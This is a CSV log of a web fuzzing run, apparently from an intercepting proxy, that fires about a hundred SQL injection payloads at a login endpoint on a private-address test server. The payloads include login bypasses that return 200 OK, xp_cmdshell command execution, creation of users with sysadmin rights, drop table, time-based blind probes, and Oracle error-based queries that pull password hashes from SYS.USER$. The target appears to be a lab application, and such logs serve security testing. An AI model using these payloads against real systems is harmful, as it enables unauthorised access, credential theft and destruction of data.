Task ID,Message Type,Req. Timestamp,Método,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Mon Jun 01 18:33:24 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,200,OK,96,447,48,331,768,Médio,,[]
1,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,275,447,77,332,26,,,['; exec master..xp_cmdshell 'ping 10.10.1.2'--]
2,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,333,447,71,286,1296,,Reflected,[create user name identified by 'pass123']
3,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,339,448,122,332,26,,,[create user name identified by pass123 temporary tablespace temp default tablespace users; ]
4,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,346,447,53,332,26,,,[' ; drop table temp --]
5,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,347,447,67,286,1278,,Reflected,"[exec sp_addlogin 'name' , 'password']"
6,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,278,447,75,286,1302,,Reflected,"[exec sp_addsrvrolemember 'name' , 'sysadmin']"
9,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,323,448,219,332,26,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)]"
7,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,340,448,126,286,1455,,Reflected,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))]"
10,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,366,447,32,332,26,,Reflected,[a]
8,Fuzzed,Mon Jun 01 18:35:39 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,469,447,77,332,26,,,[grant connect to name; grant resource to name;]
12,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,258,447,60,286,1251,,Reflected,[' union (select @@version) --]
13,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,312,447,75,286,1296,,Reflected,"[' union (select NULL, (select @@version)) --]"
14,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,314,447,81,286,1314,,Reflected,"[' union (select NULL, NULL, (select @@version)) --]"
15,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,276,447,88,286,1335,,Reflected,"[' union (select NULL, NULL, NULL,  (select @@version)) --]"
11,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,200,OK,598,447,42,331,763,,,[' or 1=1 --]
16,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,270,447,94,286,1353,,Reflected,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --]"
17,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,227,448,100,286,1371,,Reflected,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --]"
18,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,287,447,32,332,26,,Reflected,[a]
19,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,285,448,106,332,26,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --]"
20,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,288,448,106,332,26,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --]"
21,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,213,448,106,332,26,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --]"
22,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,325,448,106,332,26,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --]"
23,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,271,447,93,332,26,,,['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --]
24,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,267,447,95,332,26,,,['; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ]
25,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,282,448,123,332,26,,,['; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --]
26,Fuzzed,Mon Jun 01 18:35:40 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,308,448,123,332,26,,,['; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --]
27,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,227,447,32,332,26,,,[1]
28,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,217,447,34,286,1173,,Reflected,[1'1]
29,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,240,447,55,332,26,,,[1 exec sp_ (or exec xp_)]
30,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,265,447,40,332,26,,,[1 and 1=1]
31,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,272,447,77,286,1304,,Reflected,[1' and 1=(select count(*) from tablenames); --]
32,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,319,447,32,332,26,,Reflected,[a]
33,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,297,447,39,332,26,,,[1 or 1=1]
38,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,25,447,49,286,1109,,,[\'; desc users; --]
39,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,15,447,35,286,1109,,,[1\'1]
35,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,309,447,56,286,1243,,Reflected,[1 and user_name() = 'dbo']
36,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,282,447,32,332,26,,,[1]
37,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,311,447,56,286,1243,,Reflected,[1 and user_name() = 'dbo']
40,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,248,447,61,286,1274,,Reflected,[1' and non_existant_table = '1]
34,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,200,OK,607,447,43,331,770,,,[1' or '1'='1]
42,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,254,448,125,286,1446,,Reflected,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116]"
43,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,221,448,103,286,1380,,Reflected,"[1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --]"
44,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,338,447,64,332,26,,,[1 uni/**/on select all from where]
45,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,282,447,38,332,26,,,[ or 1=1]
47,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,156,447,76,286,1299,,Reflected,['||utl_http.request('httP://192.168.1.1/')||']
41,Fuzzed,Mon Jun 01 18:35:41 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,200,OK,508,447,72,331,763,,,[' or username is not NULL or username = ']
48,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,42,447,79,286,1308,,Reflected,"[' || myappadmin.adduser('admin', 'newpass') || ']"
51,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,222,448,115,286,1416,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i]
49,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,227,448,124,286,1443,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i]
50,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,229,448,112,286,1407,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i]
52,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,221,448,113,286,1410,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i]
54,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,116,448,132,286,1467,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i]
46,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,200,OK,585,447,42,331,770,,,[' or '1'='1]
55,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,253,448,128,286,1455,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i]
53,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,263,448,116,286,1419,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i]
56,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,253,448,135,286,1476,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i]
57,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,143,448,141,286,1494,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i]
58,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,143,448,166,286,1569,,Reflected,[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i]
59,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,157,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i]"
63,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,247,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i]"
60,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,252,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i]"
62,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,253,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i]"
61,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,261,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i]"
64,Fuzzed,Mon Jun 01 18:35:42 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,124,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i]"
67,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,158,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i]"
69,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,263,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i]"
68,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,266,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i]"
66,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,280,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i]"
65,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,289,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i]"
70,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,130,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i]"
72,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,242,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i]"
74,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,238,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i]"
75,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,234,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i]"
73,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,243,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i]"
71,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,247,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i]"
80,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,165,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i]"
78,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,283,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i]"
77,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,288,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i]"
79,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,294,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i]"
76,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,304,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i]"
81,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,189,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i]"
82,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,225,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i]"
83,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,223,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i]"
84,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,219,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i]"
86,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,162,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i]"
85,Fuzzed,Mon Jun 01 18:35:43 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,207,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i]"
87,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,147,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i]"
90,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,245,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i]"
88,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,263,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i]"
92,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,119,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i]"
91,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,248,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i]"
89,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,251,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i]"
93,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,157,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i]"
95,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,263,448,185,286,1626,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i]"
96,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,268,448,194,286,1653,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i]"
97,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,268,448,197,286,1662,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i]"
94,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,273,448,189,286,1638,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i]"
98,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,130,448,226,286,1749,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i]"
102,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,132,447,36,332,26,,,[(||6)]
101,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,234,447,36,332,26,,,['||'6]
99,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,245,447,75,286,1330,,Reflected,"['||(elt(-3+5,bin(15),ord(10),hex(char(45))))]"
100,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,235,447,34,332,26,,,[||6]
107,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,8,447,50,286,1109,,,"["" or isNULL(1/0) /*]"
104,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,300,447,37,332,26,,,[or 1=1]
109,Fuzzed,Mon Jun 01 18:35:45 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,21,447,50,286,1109,,,"["" or isNULL(1/0) /*]"
106,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,264,447,43,286,1200,,Reflected,[; or '1'='1']
103,Fuzzed,Mon Jun 01 18:35:44 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,200,OK,540,447,42,331,763,,,[' or 1=1-- ]
